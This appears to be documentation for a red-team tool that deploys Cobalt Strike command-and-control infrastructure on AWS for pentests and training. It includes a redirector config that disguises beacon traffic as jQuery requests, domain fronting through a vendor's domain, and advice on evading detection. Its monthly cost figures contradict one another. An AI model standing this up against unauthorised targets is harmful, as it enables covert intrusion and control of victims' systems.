# C2 Ad-Hoc - Single Team Server

## Overview

The **C2 Ad-Hoc** deployment provides a **lightweight, single-server Cobalt Strike infrastructure** designed for quick assessments, one-off tests, and proof-of-concept scenarios. This is the simplest C2 deployment mode.

## Architecture Components

### Infrastructure (Static IPs)

| Component | Type | Subnet | Private IP | Public IP | Purpose |
|-----------|------|--------|-----------|-----------|---------|
| **Bastion Host** | t3.micro (Ubuntu 22.04) | Management (10.0.0.0/24) | 10.0.0.10 | EIP (Elastic IP) | Legacy/fallback SSH relay (Dashboard Server is the primary entry point) |
| **Redirector 1** | t3.small (nginx HTTPS) | DMZ (10.0.1.0/24) | 10.0.1.10 | EIP (Elastic IP) | Traffic forwarding (primary) |
| **Redirector 2** | t3.small (nginx HTTPS) | DMZ (10.0.2.0/24) | 10.0.2.10 | EIP (Elastic IP) | Traffic forwarding (backup) |
| **C2 Team Server** | t3.medium (Cobalt Strike) | Private (10.0.10.0/24) | 10.0.10.10 | None | Cobalt Strike team server |
| **Attack Box** | t2.large (Windows 2022) | Private (10.0.10.0/24) | 10.0.10.50 | None | CS Client GUI, red team tools |
| **NAT Gateway** | Managed | Public | — | Auto | Outbound-only internet for private instances |

### Network Architecture

#### Internet Gateway vs NAT Gateway

The VPC has two gateways that serve fundamentally different purposes:

**Internet Gateway (IGW)** — Bidirectional, for public subnets:
- Inbound: Target beacon callbacks (HTTPS :443) arrive here, routed to redirectors
- Outbound: Any instance with an Elastic IP goes out through the IGW
- The Redirectors and Bastion all have EIPs and sit in public subnets routed through the IGW
- The operator does NOT connect here directly — they reach the **Dashboard Server** (in its own VPC), which then reaches this VPC over VPC peering. The bastion's EIP remains only as a legacy/fallback SSH relay.

**NAT Gateway** — Outbound only, for private subnets:
- The C2 Team Server and Attack Box sit in private subnets with NO public IPs
- When they need internet (apt updates, git clone, S3 downloads), traffic goes out via NAT
- Nothing from the internet can initiate a connection to private instances via NAT

#### How Elastic IPs Work (Single NIC, Not Dual-Homed)

The Bastion, Redirector 1, and Redirector 2 each have a **single NIC** with a private IP. The Elastic IP (EIP) is **not a second interface** — it's a 1-to-1 NAT mapping performed transparently by AWS at the Internet Gateway:

```
Bastion has 1 NIC → 1 private IP: 10.0.0.10

AWS translates at the IGW (the instance never sees the public IP):
  Inbound:  Fallback SSH to bastion EIP (e.g. 54.x.x.x) → IGW translates → 10.0.0.10
  Outbound: 10.0.0.10 sends traffic out → IGW translates → appears as 54.x.x.x
```

If you SSH into the bastion and run `ip addr`, you'll see **one NIC with 10.0.0.10** — the EIP never appears on the instance itself. AWS handles public↔private translation at the IGW before traffic reaches the instance.

Primary operator access does not use the bastion at all — the **Dashboard Server reaches private subnet instances (C2 at 10.0.10.10, Attack Box at 10.0.10.50) directly over VPC peering**. Within this VPC those instances are reachable via **internal routing** — all subnets in the same VPC can communicate through the local route table entry (`10.0.0.0/16 → local`), and the peering route carries Dashboard traffic to them. Security groups control which traffic is allowed, not routing. The bastion can still SSH to the same private hosts as a fallback.

#### Standard Mode (Redirectors Only)
```
Operator laptop ── SSH key + IP allow-list ──► Dashboard Server (own VPC, EIP)
                                                   │ VPC peering (10.100.0.0/16 ↔ 10.0.0.0/16)
                                                   ▼ jump host to every instance below

Internet
   ↓
Internet Gateway (bidirectional — public subnet instances have EIPs)
   ↓
Management Subnet (10.0.0.0/24)
   └── Bastion Host (10.0.0.10, EIP) ← legacy/fallback SSH relay (NOT the primary entry point)
   ↓
DMZ Subnets (10.0.1.0/24, 10.0.2.0/24)
   ├── Redirector 1 (10.0.1.10, EIP) ← Beacon traffic (port 443)
   └── Redirector 2 (10.0.2.10, EIP) ← Beacon traffic (port 443)
   ↓
Private Subnet (10.0.10.0/24) — NO public IPs, no direct internet access
   ├── C2 Team Server (10.0.10.10)  ← Cobalt Strike (port 50050) ← Dashboard reaches directly
   └── Attack Box (10.0.10.50)      ← Windows workstation (CS Client, tools) ← Dashboard reaches directly
   ↓
NAT Gateway → Internet (outbound only — updates, S3 downloads, git clone)
```

#### Domain Fronting Mode (Optional)
```
Operator laptop ── SSH key + IP allow-list ──► Dashboard Server (own VPC, EIP) ── VPC peering ──► instances below

Internet
   ↓
CloudFront (CDN edge)          ← Beacon traffic to front domain
   ↓                              Host header → your back domain
Internet Gateway
   ↓
Management Subnet (10.0.0.0/24)
   └── Bastion Host (10.0.0.10, EIP) ← legacy/fallback SSH relay (NOT the primary entry point)
   ↓
DMZ Subnets (10.0.1.0/24, 10.0.2.0/24)
   ├── Redirector 1 (10.0.1.10, EIP) ← Origin for CloudFront (HTTPS only)
   └── Redirector 2 (10.0.2.10, EIP) ← Origin for CloudFront (HTTPS only)
   ↓
Private Subnet (10.0.10.0/24) — NO public IPs
   ├── C2 Team Server (10.0.10.10)  ← Cobalt Strike (port 50050) ← Dashboard reaches directly
   └── Attack Box (10.0.10.50)      ← Windows workstation (CS Client, tools) ← Dashboard reaches directly
   ↓
NAT Gateway → Internet (outbound only)

Security: Redirector ingress locked to CloudFront IPs only
SSL: ACM cert (Client→CloudFront), Self-signed (CloudFront→Redirector)
```

## Key Features

### 1. Single Team Server Design
- **One Cobalt Strike instance** for all operations
- **Simplified management** - single point of configuration
- **Cost-effective** - minimal AWS resources
- **Perfect for**:
  - Quick pentests (1-2 weeks)
  - Proof-of-concept engagements
  - Training exercises
  - Budget-constrained projects

### 2. Redundant Redirectors
- **Two redirector instances** for high availability
- **Load distribution** across redirectors
- **If one fails**, the other maintains operations
- **Supports multiple domains** for domain fronting

### 3. Traffic Flow

#### Standard (Redirectors Only)
```
Target → HTTPS (443) → Redirector 1/2 → Forward → C2 Server (443 listener)
                          ↓
                    nginx/socat proxy
                  (SSL termination)
```

#### With Domain Fronting (Optional)
```
Target → HTTPS to front domain (e.g. grid.crowdstrike.com)
       → Host header: your-domain.cloudfront.net
       → CloudFront edge → Redirector origin (Elastic IP)
       → Forward → C2 Server (443 listener)
```

| | Redirectors Only | + Domain Fronting |
|---|---|---|
| **Blue team sees** | Traffic to your domain | Traffic to front domain (e.g. crowdstrike.com) |
| **Redirector IP** | Visible in DNS | Hidden behind CloudFront |
| **SSL** | Let's Encrypt or self-signed | ACM (auto, free) |
| **Setup time** | ~15 min | +15-30 min (CloudFront propagation) |
| **Domain burned?** | Re-point DNS | Switch to backup domain (instant) |

### 4. Attack Box (Windows Workstation)
- **Windows Server 2022** optimized for red team operations (server bloat removed, Defender disabled)
- **Cobalt Strike Client GUI** — pre-installed from S3, desktop shortcut to connect to C2 server
- **Red team tools** — cloned from GitHub repo to `C:\Tools` (PowerSploit, SharpTools, etc.)
- **Payload staging** — empty `C:\Payloads` directory for operator use during engagement
- **WSL2 with Ubuntu** — Linux tooling available alongside Windows
- **Private subnet only** (10.0.10.50) — no public IP, accessed via SSH tunnel through the Dashboard Server (bastion tunnel is a legacy fallback)
- **Toggleable** — `enable_attack_box = true` (default), can be disabled to save costs

### 5. Operator Access Patterns

The **Dashboard Server is the operator's entry point and jump host.** It lives in its own VPC (10.100.0.0/16) peered with this C2 VPC, so it reaches every instance directly — no SSH-hopping. All tunnels below run THROUGH the dashboard's EIP. The operator's laptop only runs a *dev* instance of the dashboard; production runs on this AWS server.

#### Option A: Dashboard Web UI (Recommended)
```bash
# Single tunnel from your laptop to the Dashboard Server
ssh -L 5000:localhost:5000 ubuntu@<dashboard-eip>

# Open the dashboard
http://localhost:5000
# In-browser terminal, topology, CS beacon management, deploy/destroy
```

#### Option B: SSH Tunnel to C2 through the Dashboard (CS Client on laptop)
```bash
# Tunnel through the Dashboard Server to the C2 server (peering routes the last hop)
ssh -i key.pem -L 50050:10.0.10.10:50050 ubuntu@<dashboard-eip>

# Connect Cobalt Strike client on your laptop to localhost
Host: 127.0.0.1:50050
```

#### Option C: RDP to Attack Box through the Dashboard (full workstation)
```bash
# SSH tunnel from your laptop through the Dashboard Server to attack box RDP
ssh -i key.pem -L 13389:10.0.10.50:3389 ubuntu@<dashboard-eip>

# Then RDP to localhost:13389
mstsc /v:localhost:13389

# Attack box has CS Client pre-installed — double-click desktop shortcut
# Connects to C2 server at 10.0.10.10:50050 (same private subnet, direct access)
```

#### Option D: Multiple Tunnels at Once
```bash
# Tunnel both RDP to attack box and CS client to team server via the Dashboard
ssh -i key.pem \
    -L 13389:10.0.10.50:3389 \
    -L 50050:10.0.10.10:50050 \
    ubuntu@<dashboard-eip>
```

> **Legacy fallback:** the bastion (10.0.0.10, EIP) still accepts SSH and can relay the same tunnels (`ssh -L 50050:10.0.10.10:50050 ubuntu@<bastion-eip>`) if the Dashboard Server is unavailable. It is no longer the primary path.

## Deployment

### Configuration

```hcl
# terraform.tfvars
engagement_type = "adhoc"  # Auto-configures single mode

# Or explicitly:
c2_deployment_mode = "single"
c2_server_instance_type = "t3.medium"
redirector_count = 2
redirector_instance_type = "t3.small"

# Network
vpc_cidr = "10.0.0.0/16"
public_subnet_cidrs = ["10.0.1.0/24", "10.0.2.0/24"]
private_subnet_cidrs = ["10.0.10.0/24", "10.0.11.0/24"]

# Domains (REQUIRED)
primary_domain_name = "operations.company.com"
backup_domains = ["cdn.company.com"]

# Access Control
management_cidr_blocks = ["YOUR.PUBLIC.IP/32"]
```

### Via Web Application

1. Navigate to **Configuration** page
2. Set **Engagement Type**: "Ad-Hoc"
3. Upload **Cobalt Strike distribution** file
4. Configure **Domain** (required)
5. Click **Deploy**
6. Wait 15-20 minutes for provisioning

### Via Command Line

```bash
# 1. Upload Cobalt Strike file
cp cobaltstrike-dist.tar uploads/

# 2. Deploy infrastructure
cd terraform
terraform init
terraform apply -var="engagement_type=adhoc"

# 3. Get connection info
terraform output c2_connection_info
```

## SSL/TLS Options

| Option | How it works | OPSEC | When to use |
|--------|-------------|-------|-------------|
| **Let's Encrypt** | Certbot auto-provisions trusted cert via DNS challenge | Trusted by browsers and proxies. Appears in Certificate Transparency logs. | Standard deployments without domain fronting |
| **Self-Signed** | Generated during redirector setup | Flagged by Shodan/Censys. Blocked by corporate proxies. Browser warnings. | Testing only, or as CloudFront→Redirector origin cert |
| **ACM (with Domain Fronting)** | AWS auto-provisions free cert, validates via Route 53 DNS | Trusted, no CT log exposure for internal traffic. Front domain's cert used publicly. | When domain fronting is enabled |

### SSL Flow: Standard (No Domain Fronting)
```
Target → HTTPS → Redirector (Let's Encrypt or self-signed cert) → C2 Server
```

### SSL Flow: With Domain Fronting
```
Target → HTTPS → Front domain cert (not yours)
       → CloudFront → ACM cert (auto-provisioned, free)
       → Redirector → Self-signed cert (CloudFront doesn't verify origin)
       → C2 Server
```

When domain fronting is enabled, Let's Encrypt is not needed. ACM handles the public-facing SSL automatically, and the redirector uses a self-signed cert for the CloudFront-to-origin connection.

## Security Groups

### Redirector Security Group (`proxy_redirector_sg`)

**Standard mode:**
```yaml
Inbound:
  - Port 80 (HTTP): 0.0.0.0/0
  - Port 443 (HTTPS): 0.0.0.0/0
  - Port 22 (SSH): management_cidr_blocks
  - Port 22 (SSH): bastion_sg  # For nginx config management

Outbound:
  - Port 443: c2_team_server_sg  # Beacon traffic to CS listener
  - All traffic: 0.0.0.0/0  # For updates
```

**With domain fronting** (redirector locked to CloudFront IPs only):
```yaml
Inbound:
  - Port 80 (HTTP): com.amazonaws.global.cloudfront.origin-facing  # AWS managed prefix list
  - Port 443 (HTTPS): com.amazonaws.global.cloudfront.origin-facing
  - Port 22 (SSH): management_cidr_blocks
  - Port 22 (SSH): bastion_sg

Outbound:
  - Port 443: c2_team_server_sg  # Beacon traffic to CS listener
  - All traffic: 0.0.0.0/0
```

### C2 Server Security Group (`c2_team_server_sg`)
```yaml
Inbound:
  - Port 443: proxy_redirector_sg   # Beacon traffic from redirectors (listener port)
  - Port 50050: bastion_sg          # CS client from bastion (operator SSH tunnel)
  - Port 50050: attack_box_sg       # CS client from attack box (direct)
  - Port 22: bastion_sg             # SSH management from bastion
  - Port 22: attack_box_sg          # SSH from attack box
  - Port 22: management_cidr_blocks # SSH fallback

Outbound:
  - All traffic: 0.0.0.0/0
```

Note: Port 443 is the CS HTTPS beacon listener port (configurable via `c2_listener_port`). Port 50050 is the CS client management port (configurable via `c2_server_port`). These are separate — redirectors only reach the listener port, not the management port.

### Bastion Security Group (`bastion_sg`)
```yaml
Inbound:
  - Port 22 (SSH): management_cidr_blocks

Outbound:
  - All traffic: 0.0.0.0/0
```

### Attack Box Security Group (`attack_box_sg`)
```yaml
Inbound:
  - Port 3389 (RDP): bastion_sg
  - Port 22 (SSH): bastion_sg
  - Port 5985 (WinRM): bastion_sg  # TESTING ONLY

Outbound:
  - All traffic: 0.0.0.0/0
```

## Operational Use Cases

### Use Case 1: Quick Pentest (1-2 weeks)

**Scenario**: Small business assessment, limited scope

```
Day 1-2: Deploy infrastructure
Day 3-7: Initial access & lateral movement
Day 8-10: Privilege escalation & persistence
Day 11-12: Data collection & cleanup
Day 13-14: Reporting & debrief
Day 15: Destroy infrastructure
```

**Why Ad-Hoc Works**:
- Single team server sufficient for small environment
- Short engagement doesn't justify complex infrastructure
- Cost-effective (~$60/month vs ~$120 for full red team)

### Use Case 2: Proof-of-Concept Demo

**Scenario**: Demonstrate specific attack technique to client

```bash
# 1. Deploy infrastructure (1 hour)
terraform apply

# 2. Configure listener
listeners → Add → HTTPS
Hosts: operations.company.com
Port: 443
(Redirector forwards to team server)

# 3. Generate payload
Attacks → Packages → Windows Executable

# 4. Demo attack to client
# 5. Destroy infrastructure same day
terraform destroy
```

### Use Case 3: Training Exercise

**Scenario**: Train junior red teamers on C2 infrastructure

```
Week 1: Deploy and familiarize with architecture
Week 2: Practice beacon deployment
Week 3: Lateral movement techniques
Week 4: OpSec and cleanup
```

## Redirector Configuration

### nginx Configuration

The nginx redirector config is **auto-generated** by `setup_redirector.sh` during deployment. It matches the selected Malleable C2 profile's URIs.

For the default jQuery profile, nginx proxies all matching jQuery URIs to the C2 backend:

```nginx
# /etc/nginx/sites-available/c2-redirector (auto-generated)
upstream c2_backend {
    server 10.0.10.10:443;  # C2 team server HTTPS listener
    keepalive 32;
}

server {
    listen 443 ssl http2;
    server_name api.example.com example.com www.example.com cdn.example.com;

    ssl_certificate /etc/letsencrypt/live/api.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api.example.com/privkey.pem;

    # jQuery profile URIs — matches GET, POST, and stager requests
    #   GET:    /jquery-3.3.1.min.js
    #   POST:   /jquery-3.3.2.min.js
    #   Stager: /jquery-3.3.1.slim.min.js (x86)
    #           /jquery-3.3.2.slim.min.js (x64)
    location ~ ^/jquery-3\.[0-9]+\.[0-9]+(\.slim)?\.min\.js$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        client_max_body_size 100M;
    }

    # Default: serve decoy website (non-matching URIs)
    location / {
        root /var/www/html;
        try_files $uri $uri/ =404;
    }
}
```

### Malleable C2 Profile

The default profile is the **jQuery CS 4.9 profile** from [threatexpress/malleable-c2](https://github.com/threatexpress/malleable-c2). It's downloaded from GitHub at deployment time and auto-loaded when the team server starts.

```
# Profile: /opt/cobaltstrike/profiles/jquery.profile
# Team server starts with: teamserver <IP> <password> /opt/cobaltstrike/profiles/jquery.profile

# Key URIs (must match nginx location blocks on redirectors):
http-get  { set uri "/jquery-3.3.1.min.js"; }
http-post { set uri "/jquery-3.3.2.min.js"; }
http-stager {
    set uri_x86 "/jquery-3.3.1.slim.min.js";
    set uri_x64 "/jquery-3.3.2.slim.min.js";
}

# Validate with: cd /opt/cobaltstrike/server && ./c2lint /opt/cobaltstrike/profiles/jquery.profile
```

> **Non-default profiles:** If you selected amazon, google, microsoft, or custom in the web app, the nginx URIs are pre-configured but you must provide your own `.profile` file on the team server. See the Post-Deployment Checklist in the web app for step-by-step instructions.

## Cost Breakdown

### Monthly Cost: ~$130-165

| Resource | Type | Cost/Month |
|----------|------|------------|
| C2 Server | t3.medium (24/7) | ~$30 |
| Redirector 1 | t3.small (24/7) | ~$15 |
| Redirector 2 | t3.small (24/7) | ~$15 |
| Bastion | t3.micro (24/7) | ~$8 |
| Attack Box | t2.large (24/7) | ~$50 |
| NAT Gateway | (Optional) | ~$32 |
| EBS Storage | 200GB total | ~$15 |
| Data Transfer | Minimal | ~$5-10 |
| S3 | CS files + scripts | <$1 |
| **Total (no NAT)** | | **~$138** |
| **Total (with NAT)** | | **~$170** |

### Cost Optimization

#### Short Engagements (1-2 weeks)
```
Daily cost: ~$3-4/day
2-week engagement: $42-56 total
Destroy immediately after: No ongoing costs
```

#### Proof-of-Concept (1-2 days)
```
Hourly cost: ~$0.13/hour
Weekend demo: $6-12 total
Perfect for quick demos
```

## Monitoring & Logging

### CloudWatch Logs

```bash
# View C2 server logs
aws logs tail /aws/ec2/c2-server --follow

# View redirector logs
aws logs tail /aws/ec2/redirector-1 --follow

# View all beacon callbacks
aws logs filter-pattern "POST /api/v1/status" --log-group-name /aws/ec2/redirector-1
```

### Metrics to Monitor

- **Beacon check-ins** - Frequency and pattern
- **Data transfer** - Upload/download volumes
- **Failed connections** - Potential blue team detection
- **Redirector health** - Response times, errors

## Troubleshooting

### Issue: Beacon won't call back

**Diagnosis**:
```bash
# 1. Check redirector can reach C2 server
ssh redirector1
nc -zv 10.0.10.10 443  # CS HTTPS listener port

# 2. Check nginx/socat is running
systemctl status nginx
ps aux | grep socat

# 3. Test with curl
curl -k https://operations.company.com
```

**Solution**:
- Verify security groups allow traffic
- Check redirector configuration
- Ensure C2 server has an HTTPS listener running on port 443

### Issue: Cannot connect to team server

**Diagnosis**:
```bash
# From bastion
telnet 10.0.10.10 50050  # CS management port (for client connections)

# Check Cobalt Strike is running
ssh c2-server
ps aux | grep teamserver
```

**Solution**:
```bash
# Restart teamserver if needed
sudo systemctl restart cobaltstrike
# Or manually:
cd /opt/cobaltstrike
sudo ./teamserver 10.0.10.10 <password>
```

### Issue: SSL certificate errors

**Diagnosis**:
```bash
# Check certificate on redirector
openssl s_client -connect operations.company.com:443 -servername operations.company.com
```

**Solution**:
```bash
# Regenerate LetsEncrypt certificate
sudo certbot renew --nginx
sudo systemctl reload nginx
```

## Best Practices

### OpSec Considerations

✅ **Use legitimate-looking domains**
- operations.company.com ✅
- update-service.company.com ✅
- c2server.evil.com ❌

✅ **Randomize beacon sleep times**
- Base: 5000ms, Jitter: 20% ✅
- Fixed: 1000ms ❌

✅ **Use HTTPS, not HTTP**
- Always encrypt C2 traffic
- Use valid SSL certificates

✅ **Monitor for detection**
- Check redirector logs for scanning
- Look for repeated failed connections
- Watch for unusual traffic patterns

### Cleanup After Engagement

1. **Collect artifacts** before destruction
   ```bash
   # Download from S3
   aws s3 sync s3://red-team-artifacts .artifacts/
   ```

2. **Destroy infrastructure**
   ```bash
   terraform destroy
   ```

3. **Verify deletion**
   ```bash
   aws ec2 describe-instances --filters "Name=tag:Project,Values=RedTeamInfra"
   # Should return empty
   ```

4. **Clean local files**
   ```bash
   rm -rf uploads/cobaltstrike-dist.tar
   rm -rf ssh_keys/*
   ```

## Dashboard Server (Production Control Plane)

The dashboard runs on a dedicated AWS EC2 instance in its own VPC. This is the **production control plane and SSH jump host** — the operator's entry point for this and every other deployment. The bastion is a legacy/fallback relay, no longer the primary access point. (The operator's laptop only runs a *dev* instance of the dashboard for development.)

### Dashboard Infrastructure

| Component | Type | VPC / Subnet | Private IP | Public IP | Purpose |
|-----------|------|-------------|-----------|-----------|---------|
| **Dashboard Server** | t3.medium (Ubuntu 22.04) | Dashboard VPC (10.100.0.0/16) / 10.100.1.0/24 | 10.100.1.10 | EIP (Elastic IP) | Web UI, SSH relay to all deployment instances |

### Network Connectivity

The Dashboard VPC peers with the C2 VPC, giving the dashboard server direct routable access to every instance in the deployment:

- **VPC Peering:** Dashboard VPC (10.100.0.0/16) <-> C2 VPC (10.0.0.0/16)
- Route tables on both sides carry the peering routes so traffic flows without NAT or tunnels

### Dashboard Access to C2 Instances

| Target | Ports | Purpose |
|--------|-------|---------|
| Bastion (10.0.0.10) | SSH/22 | Management shell |
| Redirector 1 (10.0.1.10) | SSH/22 | nginx config, health checks |
| Redirector 2 (10.0.2.10) | SSH/22 | nginx config, health checks |
| C2 Team Server (10.0.10.10) | SSH/22, CS/50050, REST/50443 | Shell, CS client tunnel, REST API |
| Attack Box (10.0.10.50) | SSH/22 | Management shell, RDP tunnel |

Security groups on each instance allow inbound traffic from the dashboard's security group (or the Dashboard VPC CIDR) on the ports listed above.

### Operator Access via Dashboard

The operator creates a single tunnel to the dashboard and interacts with everything through the web UI — the dashboard reaches every instance directly over VPC peering (no bastion hop):

```bash
# SSH tunnel from operator laptop to dashboard (port 5000)
ssh -i key.pem -L 5000:127.0.0.1:5000 ubuntu@<dashboard-eip>

# Open browser
http://localhost:5000
```

From the web UI the operator can:
- **Terminal tab** — in-browser SSH to any instance (bastion, redirectors, team server, attack box)
- **Topology graph** — visual map of the deployment with live status
- **Beacon management** — interact with CS beacons via the REST API (port 50443)
- **Deploy / destroy** — manage infrastructure lifecycle without a local Terraform install

### Full Architecture with Dashboard

```
Operator Laptop  (dev instance of dashboard only — production runs in AWS)
   │
   │ SSH key + IP allow-list, tunnel port 5000
   ▼
┌─────────────────────────────────────────────────┐
│  Dashboard VPC  10.100.0.0/16  (PRODUCTION)     │
│  Subnet 10.100.1.0/24                           │
│                                                 │
│  Dashboard Server (10.100.1.10, EIP)            │
│    - Flask web UI on :5000                      │
│    - Control plane + SSH jump host              │
│    - Direct SSH to all C2 instances             │
│    - REST API client to CS on :50443            │
└──────────────────────┬──────────────────────────┘
                       │ VPC Peering
                       │ (10.100.0.0/16 ↔ 10.0.0.0/16)
                       ▼
┌─────────────────────────────────────────────────┐
│  C2 VPC  10.0.0.0/16                            │
│                                                 │
│  Management Subnet (10.0.0.0/24)                │
│    └── Bastion (10.0.0.10, EIP)                 │
│                                                 │
│  DMZ Subnets (10.0.1.0/24, 10.0.2.0/24)        │
│    ├── Redirector 1 (10.0.1.10, EIP) ← :443    │
│    └── Redirector 2 (10.0.2.10, EIP) ← :443    │
│                                                 │
│  Private Subnet (10.0.10.0/24)                  │
│    ├── C2 Team Server (10.0.10.10)              │
│    │     :50050 (CS client), :50443 (REST API)  │
│    └── Attack Box (10.0.10.50)                  │
│                                                 │
│  NAT Gateway → Internet (outbound only)         │
└─────────────────────────────────────────────────┘

Beacon traffic (from targets):
  Target → HTTPS :443 → Redirector 1/2 → C2 Team Server :443
```

### Dashboard vs Bastion

| | Dashboard Server (Primary) | Bastion (Legacy / Fallback) |
|---|---|---|
| **Role** | Production control plane + SSH jump host | Fallback SSH relay only |
| **Operator connects to** | Dashboard EIP via SSH tunnel (:5000) | Bastion EIP via SSH (fallback) |
| **Reaches private instances via** | Direct from dashboard (VPC peering) | SSH hop from bastion shell |
| **CS client access** | Terminal tab in web UI, REST API, or `ssh -L 50050:10.0.10.10:50050 ...@<dashboard-eip>` | `ssh -L 50050:10.0.10.10:50050 ...@<bastion-eip>` |
| **Management UI** | Full web UI (topology, terminal, beacons) | None (CLI only) |
| **Primary entry point?** | Yes — all deployments branch from here | No — only if the dashboard is unavailable |

## When to Upgrade

### Upgrade to Purple Team Mode if:
- ❗ Need redundancy for longer engagements
- ❗ Multiple operators require simultaneous access
- ❗ Client requires high-availability SLA

### Upgrade to Full Red Team Mode if:
- ❗ Need phase-based operations
- ❗ Long-term engagement (>4 weeks)
- ❗ Advanced OpSec requirements
- ❗ Different C2 profiles per phase

## References

- [Cobalt Strike Team Server Setup](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)
- [Redirector Best Practices](https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/)
- [Malleable C2 Profiles](https://github.com/threatexpress/malleable-c2)

## Summary

C2 Ad-Hoc is **perfect for**:
- ✅ Quick assessments (1-2 weeks)
- ✅ Proof-of-concept demos
- ✅ Training exercises
- ✅ Budget-constrained projects
- ✅ Small target environments

**Trade-offs**:
- ❌ No redundancy (single team server)
- ❌ Not suitable for long engagements
- ❌ Limited scalability

**Cost**: ~$160-192/month (or ~$75-90 for 2-week engagement)

For simple, short-term engagements, this is your best choice!
